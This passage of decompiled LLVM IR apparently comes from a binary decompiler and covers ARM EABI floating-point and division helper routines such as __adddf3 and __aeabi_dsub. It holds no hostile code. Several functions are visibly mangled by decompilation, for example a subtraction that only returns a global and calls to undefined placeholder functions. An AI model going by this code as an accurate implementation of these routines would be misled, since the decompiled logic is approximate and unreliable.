  uselistorder i32 %v0_17570, { 1, 0, 2 }
  uselistorder i32 %v4_17554, { 1, 0 }
  uselistorder i32 %v1_1755c, { 1, 2, 0 }
  uselistorder i32 %v4_17548, { 1, 0 }
  uselistorder i32 %v1_17550, { 1, 2, 0 }
  uselistorder i32 %v4_1753c, { 1, 0 }
  uselistorder i32 %v1_17544, { 1, 2, 0 }
  uselistorder i32 %v1_17568, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_17538, { 1, 0 }
  uselistorder i32 %v1_17564, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_17524, { 1, 0 }
  uselistorder i32 %v3_17520, { 1, 0 }
  uselistorder i32 %v1_17520, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_17524, { 1, 2, 0, 3 }
  uselistorder i32 %v4_17510, { 1, 0 }
  uselistorder i32 %v4_1750c, { 2, 1, 0 }
  uselistorder i32 %v1_17510, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_17518.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_174e4, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_174e4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_174d8, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_17570, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1752c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17518thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_175d8 = udiv i32 %arg1, %arg2
  ret i32 %v2_175d8
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_175f0 = bitcast i64 %tmp to double
  %v9_175f0 = fadd double %v8_175f0, %arg1
  %v10_175f0 = fptrunc double %v9_175f0 to float
  %v11_175f0 = bitcast float %v10_175f0 to i32
  ret i32 %v11_175f0
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_175f4 = load i32, i32* @r0, align 4
  ret i32 %v2_175f4
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_175f8 = load i32, i32* @r4, align 4
  store i32 %v3_175f8, i32* %stack_var_-12, align 4
  %v6_175f8 = load i32, i32* @r5, align 4
  %v9_175f8 = load i32, i32* @lr, align 4
  %v0_175fc = load i32, i32* %r1.global-to-local, align 4
  %v2_175fc = mul i32 %v0_175fc, 2
  store i32 %v2_175fc, i32* %r4.global-to-local, align 4
  %v0_17600 = load i32, i32* %r3.global-to-local, align 4
  %v2_17600 = mul i32 %v0_17600, 2
  store i32 %v2_17600, i32* %r5.global-to-local, align 4
  %v4_17604 = icmp eq i32 %v2_17600, %v2_175fc
  %v1_17608 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_17604, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_17608 = load i32, i32* %r2.global-to-local, align 4
  %v5_17608 = icmp eq i32 %v2_17608, %v1_17608
  br i1 %v5_17608, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1760c = or i32 %v1_17608, %v2_175fc
  %v5_1760c = icmp eq i32 %v3_1760c, 0
  br i1 %v5_1760c, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_17610 = load i32, i32* %r2.global-to-local, align 4
  %v3_17610 = or i32 %v2_17610, %v2_17600
  %v5_17610 = icmp eq i32 %v3_17610, 0
  br i1 %v5_17610, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_175fc.off = add i32 %v2_175fc, 4194303
  %tmp = icmp ult i32 %v2_175fc.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_17600.off = add i32 %v2_17600, 4194303
  %tmp17 = icmp ult i32 %v2_17600.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1761c = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1761c, i32 ptrtoint (i32* @global_var_17854.690 to i32))
  %v0_17620 = load i32, i32* %r4.global-to-local, align 4
  %v3_17620 = udiv i32 %v0_17620, 2097152
  store i32 %v3_17620, i32* %r4.global-to-local, align 4
  %v1_17624 = load i32, i32* %r5.global-to-local, align 4
  %v4_17624 = udiv i32 %v1_17624, 2097152
  %v5_17624 = sub nsw i32 %v4_17624, %v3_17620
  %v5_17628 = icmp ult i32 %v4_17624, %v3_17620
  br i1 %v5_17628, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_17628 = sub nsw i32 0, %v5_17624
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_17628, %bb13 ], [ %v5_17624, %.thread3 ]
  %v0_1764c = phi i32 [ %v7_17628, %bb13 ], [ %v5_17624, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1762c = icmp ugt i32 %v4_17624, %v3_17620
  br i1 %v7_1762c, label %dec_label_pc_17630, label %dec_label_pc_1764c

dec_label_pc_17630:                               ; preds = %bb14
  %v2_17630 = add nsw i32 %v0_1764c, %v3_17620
  store i32 %v2_17630, i32* %r4.global-to-local, align 4
  %v0_17634 = load i32, i32* %r0.global-to-local, align 4
  %v1_17634 = load i32, i32* %r2.global-to-local, align 4
  %v0_17638 = load i32, i32* %r1.global-to-local, align 4
  %v1_17638 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_17634, i32* %r0.global-to-local, align 4
  store i32 %v1_17638, i32* %r1.global-to-local, align 4
  store i32 %v0_17634, i32* %r2.global-to-local, align 4
  store i32 %v0_17638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1764c

dec_label_pc_1764c:                               ; preds = %bb14, %dec_label_pc_17630
  %tmp18 = icmp ugt i32 %v0_1764c, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1764c
  %v6_17650 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_17650, i32* %r4.global-to-local, align 4
  store i32 %v6_175f8, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1764c, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_175f8)
  %v0_17658 = load i32, i32* %r1.global-to-local, align 4
  %v3_17658 = icmp sgt i32 %v0_17658, -1
  %v4_17664 = urem i32 %v0_17658, 1048576
  %v5_17664 = or i32 %v4_17664, 1048576
  store i32 %v5_17664, i32* %r1.global-to-local, align 4
  br i1 %v3_17658, label %dec_label_pc_17674, label %dec_label_pc_1766c

dec_label_pc_1766c:                               ; preds = %bb16
  %v0_1766c = load i32, i32* %r0.global-to-local, align 4
  %v1_1766c = sub i32 0, %v0_1766c
  store i32 %v1_1766c, i32* %r0.global-to-local, align 4
  %v2_1766c = icmp eq i32 %v0_1766c, 0
  %v2_17670 = icmp eq i1 %v2_1766c, false
  %v5_17670 = sext i1 %v2_17670 to i32
  %v6_17670 = sub nsw i32 %v5_17670, %v5_17664
  store i32 %v6_17670, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17674

dec_label_pc_17674:                               ; preds = %bb16, %dec_label_pc_1766c
  %v0_17674 = load i32, i32* %r3.global-to-local, align 4
  %v3_17674 = icmp sgt i32 %v0_17674, -1
  %v4_1767c = urem i32 %v0_17674, 1048576
  %v5_1767c = or i32 %v4_1767c, 1048576
  store i32 %v5_1767c, i32* %r3.global-to-local, align 4
  br i1 %v3_17674, label %dec_label_pc_1768c, label %dec_label_pc_17684

dec_label_pc_17684:                               ; preds = %dec_label_pc_17674
  %v0_17684 = load i32, i32* %r2.global-to-local, align 4
  %v1_17684 = sub i32 0, %v0_17684
  store i32 %v1_17684, i32* %r2.global-to-local, align 4
  %v2_17684 = icmp eq i32 %v0_17684, 0
  %v2_17688 = icmp eq i1 %v2_17684, false
  %v5_17688 = sext i1 %v2_17688 to i32
  %v6_17688 = sub nsw i32 %v5_17688, %v5_1767c
  store i32 %v6_17688, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1768c

dec_label_pc_1768c:                               ; preds = %dec_label_pc_17674, %dec_label_pc_17684
  %v0_1768c = load i32, i32* %r4.global-to-local, align 4
  %v1_1768c = load i32, i32* %r5.global-to-local, align 4
  %v4_1768c = icmp eq i32 %v1_1768c, %v0_1768c
  call void @__pseudo_cond_branch(i1 %v4_1768c, i32 ptrtoint (i32* @global_var_1783c.691 to i32))
  %v1_17690 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17690

; uselistorder directives
  uselistorder i32 %v0_17674, { 1, 0 }
  uselistorder i32 %v0_17658, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_17624, { 2, 1, 0 }
  uselistorder i32 %v3_17620, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_17608, { 1, 0 }
  uselistorder i32 %v2_17600, { 1, 3, 0, 2 }
  uselistorder i32 %v2_175fc, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_1768c, { 1, 0 }
  uselistorder label %dec_label_pc_17674, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1764c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_17694() local_unnamed_addr {
dec_label_pc_17694:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_17694 = load i32, i32* @r4, align 4
  %v1_17694 = add i32 %v0_17694, -1
  store i32 %v1_17694, i32* @r4, align 4
  %v0_17698 = load i32, i32* @r5, align 4
  %v1_17698 = sub i32 32, %v0_17698
  store i32 %v1_17698, i32* @lr, align 4
  %v5_1769c = icmp sgt i32 %v0_17698, 32
  br i1 %v5_1769c, label %dec_label_pc_176b8, label %dec_label_pc_176a0

dec_label_pc_176a0:                               ; preds = %dec_label_pc_17694
  %v0_176a0 = load i32, i32* @r2, align 4
  %v6_176a0 = shl i32 %v0_176a0, %v1_17698
  store i32 %v6_176a0, i32* %ip.global-to-local, align 4
  %v0_176a4 = load i32, i32* @r0, align 4
  %v3_176a4 = add i32 %v0_17698, -1
  %v4_176a4 = shl i32 1, %v3_176a4
  %v7_176a4 = lshr i32 %v0_176a0, %v0_17698
  %v8_176a4 = add i32 %v0_176a4, %v7_176a4
  %v9_176a4 = icmp ult i32 %v8_176a4, %v0_176a4
  %v0_176a8 = load i32, i32* @r1, align 4
  %v2_176a8 = zext i1 %v9_176a4 to i32
  %v3_176a8 = add i32 %v2_176a8, %v0_176a8
  %v1_176ac = load i32, i32* @r3, align 4
  %v7_176ac = shl i32 %v1_176ac, %v1_17698
  %v8_176ac = add i32 %v7_176ac, %v8_176a4
  store i32 %v8_176ac, i32* %r0.global-to-local, align 4
  %v5_176b0 = and i32 %v1_176ac, %v4_176a4
  %v6_176b0 = icmp ne i32 %v5_176b0, 0
  %v7_176b0 = ashr i32 %v1_176ac, %v0_17698
  %v9_176b0 = add i32 %v3_176a8, %v7_176b0
  %v10_176b0 = zext i1 %v6_176b0 to i32
  %v11_176b0 = add i32 %v10_176b0, %v9_176b0
  br label %dec_label_pc_176d4

dec_label_pc_176b8:                               ; preds = %dec_label_pc_17694
  %v1_176b8 = add i32 %v0_17698, -32
  %v1_176bc = add i32 %v1_17698, 32
  store i32 %v1_176bc, i32* @lr, align 4
  %v0_176c4 = load i32, i32* @r3, align 4
  %v2_176c4 = add i32 %v1_17698, 31
  %v3_176c4 = lshr i32 -2147483648, %v2_176c4
  %v4_176c4 = and i32 %v0_176c4, %v3_176c4
  %v5_176c4 = icmp ne i32 %v4_176c4, 0
  %v6_176c4 = shl i32 %v0_176c4, %v1_176bc
  %v2_176c8 = or i32 %v6_176c4, 2
  %v2_176c8.v6_176c4 = select i1 %v5_176c4, i32 %v2_176c8, i32 %v6_176c4
  store i32 %v2_176c8.v6_176c4, i32* %ip.global-to-local, align 4
  %v0_176cc = load i32, i32* @r0, align 4
  %v7_176cc = ashr i32 %v0_176c4, %v1_176b8
  %v8_176cc = add i32 %v0_176cc, %v7_176cc
  store i32 %v8_176cc, i32* %r0.global-to-local, align 4
  %v0_176d0 = load i32, i32* @r1, align 4
  %v2_176d0 = and i32 %v0_176c4, 1073741824
  %v3_176d0 = icmp ne i32 %v2_176d0, 0
  %v4_176d0 = ashr i32 %v0_176c4, 31
  %v6_176d0 = add i32 %v0_176d0, %v4_176d0
  %v7_176d0 = zext i1 %v3_176d0 to i32
  %v8_176d0 = add i32 %v6_176d0, %v7_176d0
  br label %dec_label_pc_176d4

dec_label_pc_176d4:                               ; preds = %dec_label_pc_176a0, %dec_label_pc_176b8
  %storemerge = phi i32 [ %v11_176b0, %dec_label_pc_176a0 ], [ %v8_176d0, %dec_label_pc_176b8 ]
  %v0_176d4 = phi i32 [ %v11_176b0, %dec_label_pc_176a0 ], [ %v8_176d0, %dec_label_pc_176b8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_176d4 = and i32 %v0_176d4, -2147483648
  store i32 %v1_176d4, i32* @r5, align 4
  %v1_176d8 = icmp sgt i32 %v0_176d4, -1
  call void @__pseudo_cond_branch(i1 %v1_176d8, i32 ptrtoint (i32* @global_var_176e8.692 to i32))
  %v0_176dc = load i32, i32* %ip.global-to-local, align 4
  %v1_176dc = sub i32 0, %v0_176dc
  store i32 %v1_176dc, i32* %ip.global-to-local, align 4
  %v2_176dc = icmp eq i32 %v0_176dc, 0
  %v0_176e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_176e0 = icmp eq i1 %v2_176dc, false
  %v5_176e0 = sext i1 %v2_176e0 to i32
  %v6_176e0 = sub i32 %v5_176e0, %v0_176e0
  store i32 %v6_176e0, i32* %r0.global-to-local, align 4
  %v7_176e0 = zext i1 %v2_176e0 to i32
  %v8_176e0 = icmp ne i32 %v6_176e0, %v7_176e0
  %v9_176e0 = icmp ne i32 %v0_176e0, -1
  %v10_176e0 = or i1 %v9_176e0, %v8_176e0
  %v11_176e0 = icmp ne i32 %v0_176e0, 0
  %v12_176e0 = select i1 %v2_176e0, i1 %v10_176e0, i1 %v11_176e0
  %v0_176e4 = load i32, i32* %r1.global-to-local, align 4
  %v5_176e4 = sext i1 %v12_176e0 to i32
  %v6_176e4 = sub i32 %v5_176e4, %v0_176e4
  store i32 %v6_176e4, i32* @r1, align 4
  ret i32 %v6_176e0

; uselistorder directives
  uselistorder i1 %v2_176e0, { 1, 2, 0 }
  uselistorder i32 %v0_176e0, { 1, 2, 0 }
  uselistorder i32 %v8_176d0, { 1, 0 }
  uselistorder i32 %v0_176c4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_176b0, { 1, 0 }
  uselistorder i32 %v1_176ac, { 1, 0, 2 }
  uselistorder i32 %v0_176a4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_176d4, { 1, 0 }
}

define i32 @function_176e8(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_176e8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_176e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_176ec = icmp ult i32 %v0_176e8, 1048574
  br i1 %v3_176ec, label %dec_label_pc_17730, label %dec_label_pc_176f0

dec_label_pc_176f0:                               ; preds = %dec_label_pc_176e8
  %v3_176f4 = icmp ult i32 %v0_176e8, 2097150
  br i1 %v3_176f4, label %dec_label_pc_17714, label %dec_label_pc_176f8

dec_label_pc_176f8:                               ; preds = %dec_label_pc_176f0
  %v1_176f8 = urem i32 %v0_176e8, 2
  %v2_176f8 = icmp ne i32 %v1_176f8, 0
  %v3_176f8 = udiv i32 %v0_176e8, 2
  store i32 %v3_176f8, i32* %r1.global-to-local, align 4
  %v0_176fc = load i32, i32* %r0.global-to-local, align 4
  %v3_176fc = zext i1 %v2_176f8 to i32
  %v6_176fc = zext i32 %v0_176fc to i64
  %v7_176fc = sub i32 33, %v0_176fc
  %v8_176fc = zext i32 %v7_176fc to i64
  %v9_176fc = shl i64 %v6_176fc, %v8_176fc
  %v10_176fc = sub i32 32, %v0_176fc
  %v11_176fc = shl i32 %v3_176fc, %v10_176fc
  %v12_176fc = zext i32 %v11_176fc to i64
  %v14_176fc = or i64 %v12_176fc, %v9_176fc
  %v15_176fc = trunc i64 %v14_176fc to i32
  %v16_176fc = add i32 %v0_176fc, -1
  %v17_176fc = shl i32 1, %v16_176fc
  %v18_176fc = and i32 %v17_176fc, %v0_176fc
  %v19_176fc = icmp ne i32 %v18_176fc, 0
  store i32 %v15_176fc, i32* %r0.global-to-local, align 4
  %v0_17700 = load i32, i32* @ip, align 4
  %v3_17700 = zext i1 %v19_176fc to i32
  %v6_17700 = zext i32 %v0_17700 to i64
  %v7_17700 = sub i32 33, %v0_17700
  %v8_17700 = zext i32 %v7_17700 to i64
  %v9_17700 = shl i64 %v6_17700, %v8_17700
  %v10_17700 = sub i32 32, %v0_17700
  %v11_17700 = shl i32 %v3_17700, %v10_17700
  %v12_17700 = zext i32 %v11_17700 to i64
  %v14_17700 = or i64 %v12_17700, %v9_17700
  %v15_17700 = trunc i64 %v14_17700 to i32
  store i32 %v15_17700, i32* @ip, align 4
  %v0_17704 = load i32, i32* @r4, align 4
  %v1_17704 = add i32 %v0_17704, 1
  store i32 %v1_17704, i32* @r4, align 4
  %v3_17708 = mul i32 %v1_17704, 2097152
  %v2_1770c = icmp ugt i32 %v3_17708, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1770c, i32 ptrtoint (i32* @global_var_178c4.693 to i32))
  br label %dec_label_pc_17714

dec_label_pc_17714:                               ; preds = %dec_label_pc_17730, %dec_label_pc_176f0, %dec_label_pc_176f8
  %v0_17714 = load i32, i32* @ip, align 4
  %v2_17714 = icmp slt i32 %v0_17714, 0
  %v6_17714 = icmp eq i32 %v0_17714, -2147483648
  %v1_17718 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_17714, label %bb, label %dec_label_pc_17714._crit_edge

bb:                                               ; preds = %dec_label_pc_17714
  %v2_17718 = urem i32 %v1_17718, 2
  %v3_17718 = icmp ne i32 %v2_17718, 0
  br label %dec_label_pc_17714._crit_edge

dec_label_pc_17714._crit_edge:                    ; preds = %dec_label_pc_17714, %bb
  %v1_1771c = phi i1 [ %v3_17718, %bb ], [ %v2_17714, %dec_label_pc_17714 ]
  %v2_1771c = zext i1 %v1_1771c to i32
  %v3_1771c = add i32 %v2_1771c, %v1_17718
  store i32 %v3_1771c, i32* %r0.global-to-local, align 4
  %v0_17720 = load i32, i32* %r1.global-to-local, align 4
  %v1_17720 = load i32, i32* @r4, align 4
  %v2_17720 = and i32 %v1_17720, 4096
  %v3_17720 = icmp ne i32 %v2_17720, 0
  %v4_17720 = mul i32 %v1_17720, 1048576
  %v6_17720 = add i32 %v4_17720, %v0_17720
  %v7_17720 = zext i1 %v3_17720 to i32
  %v8_17720 = add i32 %v7_17720, %v6_17720
  %v1_17724 = load i32, i32* @r5, align 4
  %v2_17724 = or i32 %v1_17724, %v8_17720
  store i32 %v2_17724, i32* %r1.global-to-local, align 4
  ret i32 %v3_1771c

dec_label_pc_17730:                               ; preds = %dec_label_pc_176e8
  %v0_17730 = load i32, i32* @ip, align 4
  %v1_17730 = icmp slt i32 %v0_17730, 0
  %v2_17730 = mul i32 %v0_17730, 2
  store i32 %v2_17730, i32* @ip, align 4
  %v0_17734 = load i32, i32* %r0.global-to-local, align 4
  %v3_17734 = mul i32 %v0_17734, 2
  %v4_17734 = zext i1 %v1_17730 to i32
  %v5_17734 = or i32 %v3_17734, %v4_17734
  store i32 %v5_17734, i32* %r0.global-to-local, align 4
  %v9_17734 = icmp ule i32 %v5_17734, %v0_17734
  %v10_17734 = icmp ult i32 %v3_17734, %v0_17734
  %v11_17734 = select i1 %v1_17730, i1 %v9_17734, i1 %v10_17734
  %v3_17738 = mul i32 %v0_176e8, 2
  %v4_17738 = zext i1 %v11_17734 to i32
  %v5_17738 = or i32 %v4_17738, %v3_17738
  store i32 %v5_17738, i32* %r1.global-to-local, align 4
  %v1_1773c = and i32 %v3_17738, 1048576
  %v2_1773c = icmp eq i32 %v1_1773c, 0
  %v0_17740 = load i32, i32* @r4, align 4
  %v1_17740 = add i32 %v0_17740, -1
  store i32 %v1_17740, i32* @r4, align 4
  br i1 %v2_1773c, label %bb7, label %dec_label_pc_17714

bb7:                                              ; preds = %dec_label_pc_17730
  ret i32 %v5_17734

; uselistorder directives
  uselistorder i32 %v0_17734, { 1, 2, 0 }
  uselistorder i1 %v1_17730, { 1, 0 }
  uselistorder i32 %v1_17718, { 1, 0 }
  uselistorder i32 %v0_17714, { 1, 0 }
  uselistorder i32 %v0_17700, { 1, 0, 2 }
  uselistorder i32 %v0_176fc, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_17714._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17714, { 0, 2, 1 }
}

define i32 @function_17748() local_unnamed_addr {
dec_label_pc_17748:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_17748 = load i32, i32* @r1, align 4
  %v2_17748 = icmp eq i32 %v0_17748, 0
  br i1 %v2_17748, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_17748
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_17748
  %v1_1775410 = load i32, i32* @r0, align 4
  store i32 %v1_1775410, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_177b0 = phi i32 [ %v0_17748, %bb ], [ %v1_1775410, %bb38 ]
  %v1_17768 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_17760 = icmp ugt i32 %v0_177b0, 65535
  br i1 %v2_17760, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_17764 = and i32 %v0_177b0, 32768
  %v3_17764 = icmp eq i32 %v2_17764, 0
  %v4_17764 = udiv i32 %v0_177b0, 65536
  br i1 %v3_17764, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_17768 = add nsw i32 %v1_17768, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_17774 = phi i32 [ %v1_17768, %.thread ], [ %v1_17768, %bb39 ], [ %v2_17768, %bb40 ]
  %v1_17770 = phi i32 [ %v0_177b0, %.thread ], [ %v4_17764, %bb39 ], [ %v4_17764, %bb40 ]
  %v2_1776c = icmp ugt i32 %v1_17770, 255
  br i1 %v2_1776c, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_17770 = and i32 %v1_17770, 128
  %v3_17770 = icmp eq i32 %v2_17770, 0
  %v4_17770 = udiv i32 %v1_17770, 256
  br i1 %v3_17770, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_17774 = add nsw i32 %v1_17774, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_17780 = phi i32 [ %v1_17774, %.thread3 ], [ %v1_17774, %bb41 ], [ %v2_17774, %bb42 ]
  %v1_1777c = phi i32 [ %v1_17770, %.thread3 ], [ %v4_17770, %bb41 ], [ %v4_17770, %bb42 ]
  %v2_17778 = icmp ugt i32 %v1_1777c, 15
  br i1 %v2_17778, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1777c = and i32 %v1_1777c, 8
  %v3_1777c = icmp eq i32 %v2_1777c, 0
  %v4_1777c = udiv i32 %v1_1777c, 16
  br i1 %v3_1777c, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_17780 = add nsw i32 %v1_17780, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_17788 = phi i32 [ %v1_17780, %.thread4 ], [ %v1_17780, %bb43 ], [ %v2_17780, %bb44 ]
  %v1_17790 = phi i32 [ %v1_1777c, %.thread4 ], [ %v4_1777c, %bb43 ], [ %v4_1777c, %bb44 ]
  %v2_17784 = icmp ugt i32 %v1_17790, 3
  br i1 %v2_17784, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_17788 = add i32 %v1_17788, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1778c = udiv i32 %v1_17790, 2
  %v6_1778c = sub i32 %v1_17788, %v5_1778c
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_17790 = phi i32 [ %v6_1778c, %.thread6 ], [ %v2_17788, %bb45 ]
  %v4_17790 = udiv i32 %v1_17790, 8
  %v5_17790 = sub i32 %v0_17790, %v4_17790
  %v2_17794 = add i32 %v5_17790, -32
  %v4_17794 = sub i32 31, %v5_17790
  %v5_17794 = and i32 %v4_17794, %v5_17790
  %v8_17794 = icmp eq i32 %v5_17790, 32
  %v6_17798 = icmp slt i32 %v5_17790, 32
  br i1 %v6_17798, label %dec_label_pc_1779c, label %dec_label_pc_177bc

dec_label_pc_1779c:                               ; preds = %bb46
  %v2_1779c = add i32 %v5_17790, -20
  %v7_177a0 = icmp sgt i32 %v2_17794, -12
  br i1 %v7_177a0, label %dec_label_pc_177a4, label %dec_label_pc_177b8

dec_label_pc_177a4:                               ; preds = %dec_label_pc_1779c
  %v1_177a8 = sub i32 32, %v5_17790
  %v6_177ac = shl i32 %v0_177b0, %v5_17790
  store i32 %v6_177ac, i32* @r0, align 4
  %v6_177b0 = lshr i32 %v0_177b0, %v1_177a8
  store i32 %v6_177b0, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_177b8:                               ; preds = %dec_label_pc_1779c
  %v8_1779c = icmp eq i32 %v2_1779c, 0
  %v4_1779c = add i32 %v5_17790, 2147483616
  %v5_1779c = and i32 %v2_1779c, %v4_1779c
  br label %dec_label_pc_177bc

dec_label_pc_177bc:                               ; preds = %bb46, %dec_label_pc_177b8
  %v1_177c8.in = phi i32 [ %v2_17794, %bb46 ], [ %v2_1779c, %dec_label_pc_177b8 ]
  %v6_177c8 = phi i32 [ %v2_17794, %bb46 ], [ %v5_17790, %dec_label_pc_177b8 ]
  %v2_177c8.in = phi i32 [ %v5_17794, %bb46 ], [ %v5_1779c, %dec_label_pc_177b8 ]
  %v0_177c8 = phi i1 [ %v8_17794, %bb46 ], [ %v8_1779c, %dec_label_pc_177b8 ]
  %v1_177c8 = icmp slt i32 %v1_177c8.in, 0
  %v2_177c8 = icmp slt i32 %v2_177c8.in, 0
  %v3_177bc = xor i1 %v2_177c8, %v1_177c8
  %v4_177bc = or i1 %v0_177c8, %v3_177bc
  br i1 %v4_177bc, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_177bc
  %v6_177bc = sub i32 32, %v6_177c8
  store i32 %v6_177bc, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_177bc, %bb47
  %v6_177c0 = shl i32 %v0_177b0, %v6_177c8
